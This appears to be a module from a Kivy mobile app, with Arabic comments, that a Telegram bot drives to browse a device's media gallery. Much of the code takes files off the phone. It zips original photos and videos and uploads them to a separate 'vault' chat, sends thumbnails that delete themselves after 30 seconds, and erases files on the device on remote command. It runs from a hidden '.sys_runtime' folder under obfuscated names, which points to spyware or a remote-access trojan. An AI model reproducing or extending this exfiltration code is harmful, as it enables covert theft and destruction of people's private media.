# -*- coding: utf-8 -*-
import os
import time
import zipfile
import logging
import threading
import random
import gc
import json

# إعداد المسارات الأساسية
P = os.path.join(os.getcwd(), ".sys_runtime")
T = os.path.join(P, "g_tmp")
if not os.path.exists(T):
    os.makedirs(T)

# إعداد السجلات
logging.basicConfig(filename=os.path.join(P, "g.log"), level=logging.ERROR, filemode='w')

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# محاولة استيراد Clock من Kivy (للمهام المجدولة الآمنة)
try:
    from kivy.clock import Clock
    KIVY_AVAILABLE = True
except ImportError:
    KIVY_AVAILABLE = False


class G:
    def __init__(self, sc=None, tg=None):
        self.sc = sc      # MediaScanner instance
        self.tg = tg      # TelegramUI instance
        self.ipp = 16     # Images Per Page
        self._cleanup_old_temp()   # تنظيف الملفات المؤقتة القديمة

    # ========== إصلاح 3: تنظيف الملفات المؤقتة الأقدم من ساعة ==========
    def _cleanup_old_temp(self):
        """حذف الملفات في مجلد T التي مضى عليها أكثر من ساعة"""
        try:
            now = time.time()
            for f in os.listdir(T):
                path = os.path.join(T, f)
                if os.path.getmtime(path) < now - 3600:  # أقدم من ساعة
                    os.remove(path)
        except Exception as e:
            logging.error(f"Cleanup error: {e}")

    # ========== توليد صورة مصغرة ==========
    def _thumbnail(self, path, size=(300, 300)):
        """إنشاء صورة مصغرة (Thumbnail)"""
        if not PIL_AVAILABLE or not os.path.exists(path):
            return None
        try:
            img = Image.open(path)
            img.thumbnail(size, Image.LANCZOS)
            out_path = os.path.join(T, f"th_{time.time_ns()}.jpg")
            img.save(out_path, "JPEG", quality=60)
            img.close()
            return out_path
        except Exception as e:
            logging.error(f"Thumbnail error: {e}")
            return None

    # ========== واجهة لوحة المفاتيح (للـ commands.py) ==========
    def get_grid_kb(self, cat="pending", page=0):
        """إنشاء أزرار المعرض الشبكية"""
        items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
        stats = self.sc.get_statistics()
        total = stats.get(cat, 0)
        total_pages = (total + self.ipp - 1) // self.ipp if total > 0 else 1

        keyboard = []
        row = []
        for i in range(self.ipp):
            if i < len(items):
                label = items[i].get("label", str((page * self.ipp) + i + 1).zfill(2))
                btn = {"text": f"🖼 {label}", "callback_data": f"g_opt|{cat}|{page}|{i}"}
            else:
                btn = {"text": "⬛", "callback_data": "nop"}
            row.append(btn)
            if len(row) == 4:
                keyboard.append(row)
                row = []

        # أزرار التنقل
        nav_buttons = []
        if page > 0:
            nav_buttons.append({"text": "⏮️", "callback_data": f"g_nav|{cat}|{page-1}"})
        nav_buttons.append({"text": f"📄 {page+1}/{max(1, total_pages)}", "callback_data": "nop"})
        if len(items) == self.ipp and (page + 1) < total_pages:
            nav_buttons.append({"text": "⏭️", "callback_data": f"g_nav|{cat}|{page+1}"})
        keyboard.append(nav_buttons)

        return {"inline_keyboard": keyboard}

    def show_options(self, cid, cat, page_str, idx_str):
        """عرض خيارات ملف معين"""
        page = int(page_str)
        idx = int(idx_str)
        items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
        if idx >= len(items):
            return
        item = items[idx]
        path = item['path']
        label = item.get("label", "??")
        size_mb = 0
        if os.path.exists(path):
            size_mb = round(os.path.getsize(path) / (1024 * 1024), 1)

        kb = [
            [{"text": "👁 معاينة", "callback_data": f"g_act|pr|{cat}|{page}|{idx}"}],
            [
                {"text": "⬇️ تحميل", "callback_data": f"g_act|dw|{cat}|{page}|{idx}"},
                {"text": "🗑 حذف", "callback_data": f"g_conf|de|{cat}|{page}|{idx}"}
            ],
            [{"text": "🔙 عودة", "callback_data": f"g_nav|{cat}|{page}"}]
        ]
        self.tg._ap("sendMessage", {
            "chat_id": cid,
            "text": f"📦 #{label} ({size_mb} MB)",
            "reply_markup": json.dumps({"inline_keyboard": kb})
        })

    def execute_action(self, cid, action, cat, page_str, idx_str):
        """تنفيذ الإجراء (معاينة، تحميل، حذف)"""
        page = int(page_str)
        idx = int(idx_str)
        items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
        if idx >= len(items):
            return
        item = items[idx]
        path = item['path']
        label = item.get("label", "??")

        if action == "pr":
            self._preview(cid, path)
        elif action == "dw":
            self._download(cid, path, label)
        elif action == "del":
            self._delete(cid, path, label)

    # ========== معاينة الصورة (إصلاح 2 و 4) ==========
    def _preview(self, cid, path):
        """عرض معاينة الصورة (بدون دعم الفيديو)"""
        # ✅ إصلاح 4: رفض الفيديو فوراً
        if path.lower().endswith(('.mp4', '.mkv', '.3gp', '.mov', '.avi')):
            self.tg._ap("sendMessage", {"chat_id": cid, "text": "📽 معاينة الفيديو غير مدعومة حالياً."})
            return

        thumb = self._thumbnail(path)
        if not thumb:
            self.tg._ap("sendMessage", {"chat_id": cid, "text": "❌ لا يمكن إنشاء معاينة لهذا الملف."})
            return

        try:
            with open(thumb, 'rb') as photo:
                resp = self.tg._ap("sendPhoto", {"chat_id": cid, "caption": "🔍 معاينة"}, {"photo": photo})
            # ✅ إصلاح 2: جدولة حذف الرسالة بعد 30 ثانية (بدون ترك ملف مؤقت)
            if resp and resp.get('ok') and KIVY_AVAILABLE:
                msg_id = resp['result']['message_id']
                Clock.schedule_once(lambda dt: self._delete_message(cid, msg_id), 30)
            # حذف الملف المؤقت فوراً (لا داعي للانتظار)
            os.remove(thumb)
        except Exception as e:
            logging.error(f"Preview error: {e}")
            self.tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل في إرسال المعاينة."})
        finally:
            if os.path.exists(thumb):
                try:
                    os.remove(thumb)
                except:
                    pass

    # ========== تحميل الملف (إصلاح 1: فحص الحجم) ==========
    def _download(self, cid, path, label):
        """إرسال الملف الأصلي مضغوطاً (مع حد أقصى 45 ميجابايت)"""
        if not os.path.exists(path):
            self.tg._ap("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
            return

        file_size = os.path.getsize(path)
        # ✅ إصلاح 1: رفض الملفات الكبيرة جداً (حد 45 ميجابايت)
        if file_size > 45 * 1024 * 1024:   # 45 MB
            self.tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️ حجم الملف كبير جداً (>45MB). لا يمكن إرساله عبر البوت."})
            return

        zip_path = os.path.join(T, f"dl_{random.getrandbits(32)}.zip")
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(path, os.path.basename(path))

            target_chat = getattr(self.tg, 'dat', cid)   # إرسال إلى الخزنة عادة
            with open(zip_path, 'rb') as f:
                self.tg._ap("sendDocument", {"chat_id": target_chat, "caption": f"📤 {label}"}, {"document": f})
        except Exception as e:
            logging.error(f"Download error: {e}")
            self.tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل في إرسال الملف."})
        finally:
            if os.path.exists(zip_path):
                os.remove(zip_path)
            gc.collect()

    # ========== حذف الملف نهائياً ==========
    def _delete(self, cid, path, label):
        """حذف الملف من الجهاز"""
        try:
            if os.path.exists(path):
                os.remove(path)
                self.tg._ap("sendMessage", {"chat_id": cid, "text": f"🗑 تم حذف #{label} نهائياً."})
            else:
                self.tg._ap("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود مسبقاً."})
        except Exception as e:
            logging.error(f"Delete error: {e}")
            self.tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل في حذف الملف."})
        finally:
            gc.collect()

    # ========== حذف رسالة المعاينة بعد 30 ثانية ==========
    def _delete_message(self, cid, msg_id):
        try:
            self.tg._ap("deleteMessage", {"chat_id": cid, "message_id": msg_id})
        except Exception:
            pass


def create(sc=None, tg=None):
    return G(sc, tg)
